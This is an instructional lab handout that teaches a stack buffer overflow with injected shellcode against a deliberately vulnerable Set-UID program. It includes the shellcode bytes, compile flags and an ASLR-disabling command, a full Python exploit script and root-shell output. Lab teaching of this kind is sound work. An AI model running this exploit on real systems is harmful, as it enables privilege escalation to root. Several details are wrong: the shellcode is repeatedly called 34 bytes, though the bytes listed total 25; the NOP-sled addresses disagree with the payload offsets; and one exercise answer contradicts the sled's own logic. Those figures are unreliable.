# Lab 3: SEED Labs - Injecting Your Own Code (Shellcode)

**Time:** 45-60 minutes  
**Difficulty:** Advanced (but we'll guide you step-by-step!)  
**Goal:** Learn how to inject and execute your own code in a vulnerable program

---

## Introduction: Where We Are Now

### What You've Already Done

In the previous two labs, you learned the basics of buffer overflows:

- **Lab 1 (Protostar):** You overflowed a buffer and changed a nearby variable
  - This taught you that overflowing affects adjacent memory
  
- **Lab 2 (picoCTF):** You overflowed a buffer and jumped to an existing function
  - This taught you that you can control where the program goes next

### What's New in This Lab

Now we're going to do something more powerful: **inject our own code** and make the program run it!

Think of it this way:
- Lab 1: You knocked over a cup of water (simple overflow)
- Lab 2: You redirected someone to a different room (control flow)
- Lab 3: You're bringing your own instructions and making them follow it (code injection)

---

## Section 1: Understanding the Vulnerable Program

**Purpose of this section:** See exactly what we're attacking and why it's vulnerable.

### The Source Code

Here's the program we'll exploit. Read through it and we'll explain each part:

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

// This function has the vulnerability
int bof(char *str)
{
    char buffer[24];        // ← Only 24 bytes of space
    strcpy(buffer, str);    // ← Copies ALL of str, no size check!
    return 1;
}

// Main function reads from a file and calls bof()
int main(int argc, char **argv)
{
    char str[517];          // ← Can hold 517 bytes
    FILE *badfile;

    badfile = fopen("badfile", "r");
    fread(str, sizeof(char), 517, badfile);  // ← Reads 517 bytes from file
    bof(str);               // ← Passes all 517 bytes to bof()
    printf("Returned Properly\n");
    return 1;
}
```

### Breaking Down the Vulnerability

**Line-by-line explanation:**

1. **`char buffer[24];`** - This creates space for only 24 bytes
   - Think of it like a box that can only hold 24 items

2. **`strcpy(buffer, str);`** - This copies `str` into `buffer`
   - The problem: `strcpy()` doesn't check if `buffer` is big enough!
   - It's like trying to pour 517 ounces of water into a 24-ounce cup

3. **`fread(str, sizeof(char), 517, badfile);`** - Reads 517 bytes from a file
   - We control this file! We can put anything we want in it

### The Math

```
Buffer size:     24 bytes
Input size:     517 bytes
Overflow:       517 - 24 = 493 bytes of overflow!
```

**What this means:** We have 493 extra bytes that spill over and can overwrite other parts of memory!

### Visual Representation: Stack Layout

**Normal stack frame for bof() function:**

```
Memory Layout (Stack grows downward):

Higher Addresses
    |
    v
┌─────────────────────────────┐
│  Return Address             │ ← Points back to main()
│  (4 bytes)                  │
├─────────────────────────────┤
│  Saved EBP                  │ ← Previous stack frame pointer
│  (4 bytes)                  │
├─────────────────────────────┤
│  buffer[23]                 │ ↑
│  buffer[22]                 │ |
│  ...                        │ | 24 bytes
│  buffer[1]                  │ | (our buffer)
│  buffer[0]                  │ ↓
└─────────────────────────────┘
    ^
    |
Lower Addresses
```

**What happens when we overflow with 517 bytes:**

```
Our Input (517 bytes total):
┌──────────────────────────────────────────────────┐
│ Bytes 0-23:    Fill buffer (24 bytes)            │
├──────────────────────────────────────────────────┤
│ Bytes 24-27:   Overwrite saved EBP (4 bytes)     │
├──────────────────────────────────────────────────┤
│ Bytes 28-35:   Padding (8 bytes)                 │
├──────────────────────────────────────────────────┤
│ Bytes 36-39:   OVERWRITE RETURN ADDRESS!         │ ← Our target!
├──────────────────────────────────────────────────┤
│ Bytes 40-516:  Continue overflow (477 bytes)     │
└──────────────────────────────────────────────────┘

After overflow, stack looks like:
┌─────────────────────────────┐
│  0xffffcbd0                 │ ← Return address CHANGED!
│  (points to our NOP sled)   │    (was pointing to main)
├─────────────────────────────┤
│  Overwritten data           │ ← Saved EBP destroyed
├─────────────────────────────┤
│  Filled with our input      │ ← Buffer full
└─────────────────────────────┘
```

---

## Section 2: What is Shellcode?

**Purpose of this section:** Understand what code we're injecting and why it works.

### Simple Explanation

**Shellcode** is a small piece of machine code (the 1s and 0s the CPU understands) that we inject into a program to make it do what we want.

It's called "shellcode" because it usually spawns a **shell** - a command prompt where you can type commands.

### Why We Need Shellcode

In Lab 2, we jumped to a function that already existed in the program (`win()`). But what if:
- The program doesn't have a useful function?
- We want to do something specific (like spawn a shell)?

**Solution:** We write our own instructions and inject them!

### Our Shellcode (Already Written For You)

Here's the shellcode we'll use. Don't worry about understanding every byte - just know what it does:

```python
shellcode = (
    b"\x31\xc0"             # xor eax, eax           - Clear EAX register
    b"\x50"                 # push eax               - Push NULL onto stack
    b"\x68\x2f\x2f\x73\x68" # push "//sh"            - Part of "/bin//sh"
    b"\x68\x2f\x62\x69\x6e" # push "/bin"            - Part of "/bin//sh"
    b"\x89\xe3"             # mov ebx, esp           - EBX points to "/bin//sh"
    b"\x50"                 # push eax               - Push NULL
    b"\x53"                 # push ebx               - Push pointer to string
    b"\x89\xe1"             # mov ecx, esp           - ECX points to arguments
    b"\x31\xd2"             # xor edx, edx           - Clear EDX (CRITICAL!)
    b"\xb0\x0b"             # mov al, 11             - System call number
    b"\xcd\x80"             # int 0x80               - Execute system call!
)
```

**Total size:** 34 bytes (very small!)

### Shellcode Execution Flow Diagram

```
What the shellcode does step-by-step:

STEP 1: Build string "/bin//sh" on stack
┌─────────────────────┐
│  Stack Memory:      │
│  ┌───────────────┐  │
│  │ /  b  i  n    │  │
│  ├───────────────┤  │
│  │ /  /  s  h \0 │  │
│  └───────────────┘  │
└─────────────────────┘

STEP 2: Set up registers for execve() system call
┌─────────────────────────────────┐
│  EBX → points to "/bin//sh"     │ (program to execute)
│  ECX → points to argv array     │ (arguments)
│  EDX → 0x00000000               │ (environment, must be NULL!)
│  EAX → 11 (0x0b)                │ (execve syscall number)
└─────────────────────────────────┘

STEP 3: Make system call
  int 0x80  →  Kernel executes: execve("/bin//sh", argv, NULL)

STEP 4: Shell spawns!
  # ← You get a root shell prompt
```

### What Each Part Does (Simplified)

**Step 1: Build the string "/bin/sh"**
```python
b"\x31\xc0"             # Start fresh - clear a register
b"\x50"                 # Put a NULL at the end (strings need this)
b"\x68\x2f\x2f\x73\x68" # Add "//sh" to memory
b"\x68\x2f\x62\x69\x6e" # Add "/bin" to memory
# Result: We now have "/bin//sh" in memory (the extra / is okay)
```

**Step 2: Point to our string**
```python
b"\x89\xe3"             # Save the location of "/bin//sh"
```

**Step 3: Prepare arguments**
```python
b"\x50"                 # NULL (end of arguments)
b"\x53"                 # Pointer to "/bin//sh"
b"\x89\xe1"             # Save location of arguments
```

**Step 4: Clear a register (IMPORTANT!)**
```python
b"\x31\xd2"             # Clear EDX - if we don't do this, the shell crashes!
# This line took 3 hours to figure out - don't skip it!
```

**Step 5: Execute!**
```python
b"\xb0\x0b"             # Tell CPU: "I want to run a program" (system call 11)
b"\xcd\x80"             # Do it! Execute /bin/sh
```

### What Happens When This Runs

1. CPU reads these bytes as instructions
2. Builds the string "/bin/sh" in memory
3. Calls the operating system
4. OS launches /bin/sh (a shell)
5. **You get a command prompt with root access!**

---

## Section 3: The NOP Sled Technique

**Purpose of this section:** Learn how to make our exploit reliable even without exact addresses.

### The Problem We Need to Solve

When we overflow the buffer, we need to make the program jump to our shellcode. But there's a problem:

**We need to know the EXACT address where our shellcode is in memory.**

Example:
- If shellcode is at address `0xffffcb08`, we must jump to `0xffffcb08`
- If we jump to `0xffffcb09` (off by 1!), the CPU reads garbage and crashes
- If we jump to `0xffffcb07` (off by 1 the other way!), also crashes

**This is hard because:**
- Addresses change slightly each time the program runs
- Debugging shows different addresses than normal execution
- We might not know the exact address

### The Solution: NOP Sled

A **NOP sled** (also called a **NOP slide**) is a clever trick:

**NOP** = "No Operation" instruction
- In machine code: `\x90`
- What it does: Absolutely nothing! Just moves to the next instruction

**The idea:** Instead of one perfect landing spot, create a HUGE landing zone!

### NOP Sled Visual Diagram

```
Our 517-byte buffer with NOP sled:

Memory Address    | Content                | What happens
------------------|------------------------|---------------------------
0xffffcb08        | NOP (\x90)            | ← Jump here? Executes NOP
0xffffcb09        | NOP (\x90)            |   Slides forward...
0xffffcb0a        | NOP (\x90)            |   Slides forward...
...               | ... (200 NOPs) ...    |   Slides forward...
0xffffcbd0        | NOP (\x90)            | ← Our target jump address
0xffffcbd1        | NOP (\x90)            |   Slides forward...
...               | ... (more NOPs) ...   |   Slides forward...
0xffffcc00        | \x31 (shellcode!)     | ← Reaches shellcode!
0xffffcc01        | \xc0 (shellcode)      |   Executes our code!
0xffffcc02        | \x50 (shellcode)      |   Executes our code!
...               | ... (34 bytes) ...    |   Executes our code!
0xffffcc21        | End of shellcode      |   Shell spawns!

Complete Buffer Layout (517 bytes):
┌──────────────────────────────────────┐
│ Bytes 0-35:    NOPs + Return Addr    │
├──────────────────────────────────────┤
│ Bytes 36-39:   0xffffcbd0            │ ← Points to NOP sled
├──────────────────────────────────────┤
│ Bytes 40-482:  NOP NOP NOP ...       │ ← 443 NOPs (landing zone)
├──────────────────────────────────────┤
│ Bytes 483-516: Shellcode (34 bytes)  │ ← Our injected code
└──────────────────────────────────────┘
```

### How It Works: The Slide

**When we jump to ANY address in the NOP sled:**

```
Step-by-step execution:

1. Jump to 0xffffcbd0
   CPU reads: 0x90 (NOP)
   CPU does: Nothing, moves to next instruction

2. Now at 0xffffcbd1  
   CPU reads: 0x90 (NOP)
   CPU does: Nothing, moves to next instruction

3. Now at 0xffffcbd2
   CPU reads: 0x90 (NOP)
   CPU does: Nothing, moves to next instruction

   ... continues for hundreds of bytes ...

443. Now at 0xffffcc00
   CPU reads: 0x31 (first byte of shellcode!)
   CPU does: Executes "xor eax, eax"

444. Now at 0xffffcc01
   CPU reads: Next shellcode byte
   CPU does: Continues executing our shellcode

   ... shellcode executes ...

Result: Shell spawns!
```

### Real-World Analogy

Think of it like bowling:
- **Without NOP sled:** You need to hit ONE specific pin perfectly (very hard!)
- **With NOP sled:** The entire lane is covered with pins - wherever the ball goes, it hits something and rolls forward to the target (easy!)

### Why This is Brilliant

Instead of needing the EXACT address (like `0xffffcc00`), we can jump to ANY address in a 200-byte range!

```
Forgiveness Zone:

Jump to 0xffffcb08? → Slides to shellcode → Works!
Jump to 0xffffcb50? → Slides to shellcode → Works!
Jump to 0xffffcbd0? → Slides to shellcode → Works!
Jump to 0xffffcbf0? → Slides to shellcode → Works!
Jump to 0xffffcc00? → At shellcode! → Works!

200+ bytes of forgiveness instead of 1 byte precision!
```

---

## Section 4: Three Critical Mistakes (And How to Avoid Them)

**Purpose of this section:** Learn from 3+ hours of debugging so you don't make the same mistakes!

### Mistake #1: Wrong Compilation Flags

**The Problem:** If you compile the program wrong, your exploit will ALWAYS fail, no matter what you do.

**What happens:** You'll see "Segmentation fault" and spend hours debugging for nothing.

**Why it happens:** Modern security features randomize addresses, making exploits impossible.

### How to Compile CORRECTLY

**ALWAYS use this EXACT command:**

```bash
gcc -m32 -fno-stack-protector -z execstack -no-pie -o stack stack.c
```

**What each flag means:**

- **`-m32`** - Compile as 32-bit program
  - Why: 32-bit is easier to exploit (smaller addresses)
  
- **`-fno-stack-protector`** - Turn off stack canaries
  - Why: Stack canaries detect and stop buffer overflows
  
- **`-z execstack`** - Make the stack executable
  - Why: We need to RUN our shellcode from the stack
  
- **`-no-pie`** - Disable Position Independent Executable
  - Why: **THIS IS CRITICAL!** PIE randomizes addresses

### How to Verify It Worked

**Run this command:**
```bash
file stack
```

**You should see:**
```
stack: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV)...
```

**The important word:** `executable`

**BAD - If you see this:**
```
stack: ELF 32-bit LSB pie executable...
```

**The word "pie" means it's WRONG!** You MUST recompile!

**Why this matters:** If you see "pie", addresses randomize. Your exploit will get different addresses every time and always crash.

---

### Mistake #2: Using Addresses from GDB

**The Problem:** Addresses you find in GDB (the debugger) are WRONG for the real program!

**What happens:** Exploit works in GDB but crashes when run normally (or vice versa).

**Why it happens:** GDB adds extra environment variables when debugging, shifting the stack by ~224 bytes.

### GDB vs Runtime Address Difference Diagram

```
Address Comparison:

┌─────────────────────────────────────┐
│        IN GDB (Debugging):          │
│  ┌───────────────────────────────┐  │
│  │ Buffer at: 0xffffcce8         │  │ ← GDB shows this
│  └───────────────────────────────┘  │
└─────────────────────────────────────┘
                  |
                  | GDB adds environment variables:
                  | - LINES
                  | - COLUMNS
                  | - _ (path to program)
                  | 
                  v Stack shifts by ~224 bytes (0xe0)
                  
┌─────────────────────────────────────┐
│      IN RUNTIME (Normal Run):       │
│  ┌───────────────────────────────┐  │
│  │ Buffer at: 0xffffcb08         │  │ ← Real address!
│  └───────────────────────────────┘  │
└─────────────────────────────────────┘

Difference: 0xffffcce8 - 0xffffcb08 = 0xe0 (224 bytes)

WHY THIS MATTERS:
If you use GDB address (0xffffcce8) in your exploit,
you'll jump to the WRONG place when running normally!
```

### Example of the Problem

```bash
# In GDB (debugger):
(gdb) x/x buffer
0xffffcce8    ← Buffer address in GDB

# In normal execution:
0xffffcb08    ← Real buffer address
```

**Difference:** `0xffffcce8 - 0xffffcb08 = 0xe0` = **224 bytes off!**

### The Solution: Create a Debug Program

We'll modify the program to print its own address. Create a file called `stack_debug.c`:

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

// Helper function to get stack pointer
// Don't worry about understanding this - it just gets an address
unsigned long get_sp(void) {
    __asm__("movl %esp,%eax");
}

int bof(char *str)
{
    char buffer[24];
    
    // This is the key line - prints the buffer's real address
    printf("Buffer address: 0x%x\n", (unsigned int)buffer);
    printf("Stack pointer: 0x%lx\n", get_sp());
    
    strcpy(buffer, str);
    return 1;
}

int main(int argc, char **argv)
{
    char str[517];
    FILE *badfile;

    badfile = fopen("badfile", "r");
    fread(str, sizeof(char), 517, badfile);
    bof(str);
    printf("Returned Properly\n");
    return 1;
}
```

**What this does:** Prints the buffer's address when you run it normally (not in GDB).

### How to Use It

```bash
# Compile the debug version
gcc -m32 -fno-stack-protector -z execstack -no-pie -o stack_debug stack_debug.c

# Make it a Set-UID program (runs as root)
sudo chown root stack_debug
sudo chmod 4755 stack_debug

# Run it
./stack_debug
```

**Output:**
```
Buffer address: 0xffffcb08    ← USE THIS ADDRESS IN YOUR EXPLOIT!
Stack pointer: 0xffffcc20
```

**Use the "Buffer address" value in your exploit!**

---

### Mistake #3: Dirty EDX Register

**The Problem:** Shell spawns for a split second, then crashes immediately.

**What you see:**
```bash
$ ./stack
# (Shell appears!)
$ whoami
Segmentation fault    ← Crashes!
```

**Why it happens:** The `execve()` system call (which launches programs) requires certain CPU registers to be clean. If the EDX register has garbage in it, the system call fails.

**This took 3 hours to debug!** The shell would spawn but die instantly.

### EDX Register Issue Diagram

```
System Call Requirements for execve():

┌──────────────────────────────────────────┐
│  execve() System Call (number 11)        │
├──────────────────────────────────────────┤
│  Required Register Values:               │
│                                          │
│  EBX → pointer to program path           │ ✓ We set this
│        ("/bin//sh")                      │
│                                          │
│  ECX → pointer to argv array             │ ✓ We set this
│        (arguments)                       │
│                                          │
│  EDX → pointer to envp OR NULL           │ ✗ Contains garbage!
│        (environment)                     │    MUST be 0!
│                                          │
│  EAX → 11 (syscall number)               │ ✓ We set this
└──────────────────────────────────────────┘

What happens with dirty EDX:
┌────────────────────────────────────┐
│ EDX = 0x41414141 (garbage)        │ → execve() FAILS!
│ System call returns error          │ → Shell crashes!
└────────────────────────────────────┘

What happens with clean EDX:
┌────────────────────────────────────┐
│ EDX = 0x00000000 (NULL)           │ → execve() SUCCEEDS!
│ Shell launches properly            │ → We get root!
└────────────────────────────────────┘
```

### The Fix (Already in Our Shellcode)

Look at this line in our shellcode:

```python
b"\x31\xd2"    # xor edx, edx
```

**What it does:** Clears the EDX register (sets it to 0)

**What happens if you remove it:** Shell crashes immediately!

**Good news:** Our shellcode already has this fix, so you don't need to worry about it. Just don't remove that line!

---

## Section 5: Building the Exploit

**Purpose of this section:** Put everything together into a working exploit script.

### The Overall Strategy: Payload Structure

```
Complete 517-byte payload layout:

Byte Range     | Content              | Purpose
---------------|----------------------|---------------------------
0 - 35         | NOP NOP NOP ...      | Padding before return addr
               | (\x90 repeated)      | 
---------------|----------------------|---------------------------
36 - 39        | 0xbd 0xcb 0xff 0xff  | Return address
               | (little-endian)      | Points to buffer+200
---------------|----------------------|---------------------------
40 - 482       | NOP NOP NOP ...      | NOP sled (landing zone)
               | (\x90 repeated)      | 443 NOPs total!
---------------|----------------------|---------------------------
483 - 516      | \x31\xc0\x50\x68...  | Shellcode (34 bytes)
               | (our injected code)  | Spawns /bin/sh
---------------|----------------------|---------------------------

Visual representation:
┌─────────────────────────────────────────┐
│  36 bytes of NOPs                       │
├─────────────────────────────────────────┤
│  0xffffcbd0 (return address)            │ ← Overwrites saved EIP
├─────────────────────────────────────────┤
│  443 bytes of NOPs (NOP sled)           │ ← Landing zone
├─────────────────────────────────────────┤
│  34 bytes of shellcode                  │ ← Our malicious code
└─────────────────────────────────────────┘

Total: 517 bytes (exactly what program reads!)
```

### The Exploit Code

Create a file called `seedlabs_exploit.py`:

```python
#!/usr/bin/env python3
# This script generates the malicious payload

import struct  # For converting numbers to bytes

# ============================================================================
# PART 1: Our shellcode (the code we're injecting)
# ============================================================================

shellcode = (
    b"\x31\xc0"             # xor eax, eax
    b"\x50"                 # push eax
    b"\x68\x2f\x2f\x73\x68" # push "//sh"
    b"\x68\x2f\x62\x69\x6e" # push "/bin"
    b"\x89\xe3"             # mov ebx, esp
    b"\x50"                 # push eax
    b"\x53"                 # push ebx
    b"\x89\xe1"             # mov ecx, esp
    b"\x31\xd2"             # xor edx, edx  ← CRITICAL LINE!
    b"\xb0\x0b"             # mov al, 11
    b"\xcd\x80"             # int 0x80
)

print(f"[+] Shellcode is {len(shellcode)} bytes")  # Should be 34

# ============================================================================
# PART 2: Set the addresses
# ============================================================================

# CHANGE THIS - Get this address from running stack_debug
buffer_addr = 0xffffcb08    # ← PUT YOUR ADDRESS HERE!

# We'll jump to the middle of the NOP sled (200 bytes in)
# This gives us room for error
ret_addr = buffer_addr + 200

print(f"[+] Buffer starts at: {hex(buffer_addr)}")
print(f"[+] Jumping to: {hex(ret_addr)}")

# ============================================================================
# PART 3: Build the payload
# ============================================================================

# Create a 517-byte array filled with NOPs
payload = bytearray([0x90] * 517)

# Position 36-39: Overwrite the return address
# struct.pack converts the number to 4 bytes (little-endian)
ret_offset = 36
payload[ret_offset:ret_offset+4] = struct.pack("<I", ret_addr)

print(f"[+] Return address placed at offset {ret_offset}")

# Position 483-516: Place our shellcode at the END
# 517 - 34 = 483 (starting position)
shellcode_start = 517 - len(shellcode)  # = 483
payload[shellcode_start:] = shellcode

print(f"[+] Shellcode placed at offset {shellcode_start}")

# ============================================================================
# PART 4: Save the payload to a file
# ============================================================================

# The vulnerable program reads from a file called "badfile"
with open('badfile', 'wb') as f:
    f.write(payload)

print(f"[+] Payload saved to 'badfile' ({len(payload)} bytes)")
print("[+] Now run: ./stack")
print("[+] You should get a root shell!")
```

### Understanding Each Part

**Part 1: Shellcode**
- This is the code that spawns `/bin/sh`
- It's already written for you - just use it as-is
- Total: 34 bytes

**Part 2: Addresses**
- `buffer_addr` = Where the buffer is in memory (get from `stack_debug`)
- `ret_addr` = Where we'll jump to (middle of NOP sled)
- We add 200 to give ourselves room for error

**Part 3: Build Payload**
- Start with 517 NOPs (`\x90`)
- At position 36: Put the return address (4 bytes)
  - `struct.pack("<I", ret_addr)` converts number to bytes
  - `"<I"` means "little-endian unsigned integer"
- At position 483: Put our shellcode (34 bytes)

**Part 4: Save to File**
- Write the payload to `badfile`
- The vulnerable program will read this file

---

## Section 6: Running the Exploit

**Purpose of this section:** Execute the attack step-by-step.

### Step 1: Prepare the System

**First, disable address randomization:**

```bash
sudo sysctl -w kernel.randomize_va_space=0
```

**What this does:** Turns off ASLR (Address Space Layout Randomization)
- ASLR moves programs to random addresses each time they run
- This makes exploits fail because we can't predict addresses
- We're turning it off to learn how exploits work

**Note:** On a real system, you'd NEVER turn this off - it's a critical security feature!

---

### Step 2: Compile the Vulnerable Program

```bash
# Navigate to the directory
cd ~/buffer-overflow-teaching-kit/vulnerable-programs/seedlabs-stack

# Compile with the CORRECT flags (no PIE!)
gcc -m32 -fno-stack-protector -z execstack -no-pie -o stack stack.c

# Verify it compiled correctly
file stack
# Should say "ELF 32-bit LSB executable" (NOT "pie executable")
```

---

### Step 3: Make it a Set-UID Program

```bash
# Change owner to root
sudo chown root stack

# Set the Set-UID bit
sudo chmod 4755 stack

# Verify the permissions
ls -l stack
```

**You should see:**
```
-rwsr-xr-x  1 root  ...  stack
 ↑
 └─ This 's' means Set-UID is enabled
```

**What Set-UID means:**
- Normally, programs run with YOUR permissions
- Set-UID makes it run with the OWNER's permissions
- Since root owns it, the program runs as root!
- When we spawn a shell, we get a ROOT shell!

---

### Step 4: Find the Buffer Address

```bash
# Compile the debug version
gcc -m32 -fno-stack-protector -z execstack -no-pie -o stack_debug stack_debug.c

# Make it Set-UID too
sudo chown root stack_debug
sudo chmod 4755 stack_debug

# Run it to see the address
./stack_debug
```

**Output:**
```
Buffer address: 0xffffcb08    ← COPY THIS ADDRESS!
Stack pointer: 0xffffcc20
```

---

### Step 5: Update Your Exploit

**Open `seedlabs_exploit.py` and change this line:**

```python
buffer_addr = 0xffffcb08    # ← PUT THE ADDRESS YOU JUST GOT!
```

**Save the file!**

---

### Step 6: Generate the Payload

```bash
# Navigate to exploits directory
cd ~/buffer-overflow-teaching-kit/exploits

# Run the exploit script
python3 seedlabs_exploit.py
```

**Output:**
```
[+] Shellcode is 34 bytes
[+] Buffer starts at: 0xffffcb08
[+] Jumping to: 0xffffcbd0
[+] Return address placed at offset 36
[+] Shellcode placed at offset 483
[+] Payload saved to 'badfile' (517 bytes)
[+] Now run: ./stack
[+] You should get a root shell!
```

**This creates a file called `badfile` with our malicious payload!**

---

### Step 7: Execute the Attack!

```bash
# Go to where the vulnerable program is
cd ~/buffer-overflow-teaching-kit/vulnerable-programs/seedlabs-stack

# Run the vulnerable program
./stack
```

### What Should Happen

**If successful, you'll get a shell prompt:**

```bash
#     ← This is a root shell prompt!
```

**Try these commands:**

```bash
# whoami
root

# id
uid=1000(yourname) gid=1000(yourname) euid=0(root) groups=0(root),...

# ls
badfile  stack  stack.c
```

**Explanation of the output:**
- `whoami` shows you're root
- `uid=1000` is your normal user ID
- `euid=0(root)` means effective user ID is root - you have root powers!

**To exit the shell:**
```bash
# exit
```

---

## Section 7: What Just Happened? (Attack Timeline)

**Purpose of this section:** Understand the complete attack flow.

### The Attack Timeline Diagram

```
Complete Attack Flow:

STEP 1: Program Starts
┌──────────────────────────────────────┐
│ main() opens "badfile"               │
│ Reads 517 bytes into str[]           │
└──────────────────────────────────────┘
                |
                v
STEP 2: bof() Called
┌──────────────────────────────────────┐
│ bof(str) receives 517-byte string    │
│ Tries to strcpy() into 24-byte buffer│
└──────────────────────────────────────┘
                |
                v
STEP 3: Buffer Overflow
┌──────────────────────────────────────┐
│ BEFORE:                 AFTER:       │
│ [ret addr: main]  →  [ret: 0xffffcbd0]
│ [saved EBP]       →  [NOPs]          │
│ [buffer: empty]   →  [buffer: NOPs]  │
└──────────────────────────────────────┘
                |
                v
STEP 4: Function Returns
┌──────────────────────────────────────┐
│ bof() finishes, tries to return      │
│ Reads return address from stack      │
│ Jumps to: 0xffffcbd0 (our NOP sled!) │
│ (Instead of returning to main)       │
└──────────────────────────────────────┘
                |
                v
STEP 5: NOP Sled Execution
┌──────────────────────────────────────┐
│ 0xffffcbd0: NOP → continue           │
│ 0xffffcbd1: NOP → continue           │
│ 0xffffcbd2: NOP → continue           │
│ ... slides through NOPs ...          │
│ 0xffffcc00: Reaches shellcode!       │
└──────────────────────────────────────┘
                |
                v
STEP 6: Shellcode Executes
┌──────────────────────────────────────┐
│ Builds string "/bin//sh"             │
│ Sets up registers:                   │
│   EBX → "/bin//sh"                   │
│   ECX → argv                         │
│   EDX → 0 (NULL)                     │
│   EAX → 11 (execve)                  │
│ Calls: int 0x80                      │
└──────────────────────────────────────┘
                |
                v
STEP 7: Shell Spawns
┌──────────────────────────────────────┐
│ Kernel executes: execve("/bin//sh")  │
│ New shell process starts as root     │
│ We get: #  ← root prompt!           │
└──────────────────────────────────────┘
```

### Key Moments in the Attack

**Moment 1: The Overflow**
```
strcpy() copies 517 bytes into 24-byte buffer
Overflow begins at byte 25, continues for 493 bytes
```

**Moment 2: Return Address Overwrite**
```
Bytes 36-39 overwrite the saved return address
Old value: 0x080485xx (points to main)
New value: 0xffffcbd0 (points to our NOP sled)
```

**Moment 3: The Jump**
```
When bof() executes 'ret' instruction:
  Pops address from stack: 0xffffcbd0
  Jumps to that address
  CPU now executing our NOP sled!
```

**Moment 4: The Slide**
```
Executes hundreds of NOPs
Each NOP does nothing, just moves forward
Eventually reaches our shellcode
```

**Moment 5: Root Shell**
```
Shellcode calls execve()
OS spawns /bin/sh with root privileges
We gain root access!
```

---

## Section 8: Simple Exercise

**Purpose of this section:** Test your understanding with hands-on challenges.

### Exercise: Break It On Purpose!

Let's experiment to understand how precise exploits need to be.

**Challenge 1: Wrong Address**

1. Open `seedlabs_exploit.py`
2. Change the buffer address to something wrong:
   ```python
   buffer_addr = 0xffffcb00    # Off by 8 bytes!
   ```
3. Run `python3 seedlabs_exploit.py`
4. Run `./stack`

**Question:** What happens?

<details>
<summary>Click to see answer</summary>

**Segmentation fault!** The program crashes because we jumped to the wrong address.

**Why:** Our return address points to 0xffffcb00 + 200 = 0xffffcbc8, but the buffer actually starts at 0xffffcb08. We jumped outside our NOP sled, likely to invalid memory or code that doesn't make sense. The CPU can't execute whatever is there, so it crashes.

**Lesson:** Address precision matters! Even being off by a few bytes can break the exploit (though NOP sleds give us some forgiveness).

</details>

---

**Challenge 2: Remove EDX Clearing**

1. Open `seedlabs_exploit.py`
2. Remove the line with `\x31\xd2` from shellcode:
   ```python
   shellcode = (
       b"\x31\xc0"
       b"\x50"
       b"\x68\x2f\x2f\x73\x68"
       b"\x68\x2f\x62\x69\x6e"
       b"\x89\xe3"
       b"\x50"
       b"\x53"
       b"\x89\xe1"
       # b"\x31\xd2"    ← REMOVED THIS LINE
       b"\xb0\x0b"
       b"\xcd\x80"
   )
   ```
3. Run the exploit

**Question:** What happens?

<details>
<summary>Click to see answer</summary>

Shell might spawn very briefly but crashes immediately! This shows why clearing EDX is critical.

**Why:** The execve() system call requires EDX to be NULL (0). If EDX contains garbage (leftover data from previous operations), the system call fails. The kernel returns an error, and our shell process immediately terminates.

**Lesson:** System calls have specific requirements. You must set up registers correctly, or the call will fail.

</details>

---

**Challenge 3: Make NOP Sled Tiny**

1. Change the payload to have almost no NOPs:
   ```python
   # Instead of 517 NOPs, let's use mostly shellcode
   payload = bytearray([0x90] * 50)  # Only 50 bytes total
   payload[36:40] = struct.pack("<I", buffer_addr + 10)
   payload[40:40+len(shellcode)] = shellcode
   ```
2. Try to make the exploit work

**Question:** Is it harder or easier?

<details>
<summary>Click to see answer</summary>

Much harder! With a small NOP sled, you need almost exact addresses. The big NOP sled gives you forgiveness.

**Why:** With a large NOP sled (200+ bytes), you can be off by dozens of bytes and still land somewhere in the sled. With a tiny sled (10-20 bytes), being off by even 5 bytes might miss the sled entirely and crash.

**Lesson:** NOP sleds are a reliability technique. Bigger sled = more reliable exploit.

</details>

---

**After experimenting, restore the original exploit code!**

---

## Section 9: Troubleshooting Guide

**Purpose of this section:** Fix common problems quickly.

### Problem 1: "Segmentation fault"

**This means:** The program crashed (jumped to wrong memory).

**Check these things:**

1. **Is the buffer address correct?**
   ```bash
   # Run stack_debug again to verify
   ./stack_debug
   # Update seedlabs_exploit.py with the address it prints
   ```

2. **Did you compile with -no-pie?**
   ```bash
   file stack
   # Should NOT say "pie executable"
   # If it does, recompile:
   gcc -m32 -fno-stack-protector -z execstack -no-pie -o stack stack.c
   ```

3. **Is ASLR disabled?**
   ```bash
   cat /proc/sys/kernel/randomize_va_space
   # Should output: 0
   # If not, run:
   sudo sysctl -w kernel.randomize_va_space=0
   ```

---

### Problem 2: "Permission denied" or "Operation not permitted"

**This means:** The program doesn't have the right permissions.

**Fix:**
```bash
cd ~/buffer-overflow-teaching-kit/vulnerable-programs/seedlabs-stack

# Set ownership and permissions
sudo chown root stack
sudo chmod 4755 stack

# Verify
ls -l stack
# Should show: -rwsr-xr-x  1 root ...
```

---

### Problem 3: Shell spawns but crashes immediately

**This means:** EDX register issue (rare if you're using our shellcode).

**Fix:** Make sure your shellcode has this line:
```python
b"\x31\xd2"    # xor edx, edx
```

---

### Problem 4: "badfile: No such file or directory"

**This means:** The payload file isn't in the right place.

**Fix:**
```bash
# Make sure you run the exploit from the right directory
cd ~/buffer-overflow-teaching-kit/exploits
python3 seedlabs_exploit.py

# This creates badfile in the current directory
# Now go to where stack is and run it
cd ~/buffer-overflow-teaching-kit/vulnerable-programs/seedlabs-stack
./stack
```

---

### Problem 5: Nothing happens at all

**Possible causes:**

1. **Wrong directory:**
   ```bash
   # Make sure badfile is in the same directory as stack
   cd ~/buffer-overflow-teaching-kit/vulnerable-programs/seedlabs-stack
   ls badfile  # Should exist
   ```

2. **Shellcode is wrong:**
   ```bash
   # Verify shellcode length
   python3 -c "shellcode = b'\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x31\\xd2\\xb0\\x0b\\xcd\\x80'; print(len(shellcode))"
   # Should output: 34
   ```

---

## Section 10: Summary and Next Steps

**Purpose of this section:** Recap what you learned and where to go next.

### What You Accomplished

You just completed one of the most advanced buffer overflow attacks! Here's what you did:

**Technical Skills Gained:**
- Understood code injection - How to inject your own code into a running program
- Learned about shellcode - Machine code that spawns a shell
- Used NOP sleds - A clever technique for reliable exploits
- Avoided critical mistakes - PIE compilation, GDB addresses, EDX register
- Built a complete exploit - From analyzing the vulnerability to getting root
- Spawned a root shell - Gained root access through code injection

### Key Concepts You Mastered

1. **Buffer overflows can do more than change variables** - They can inject and run code!
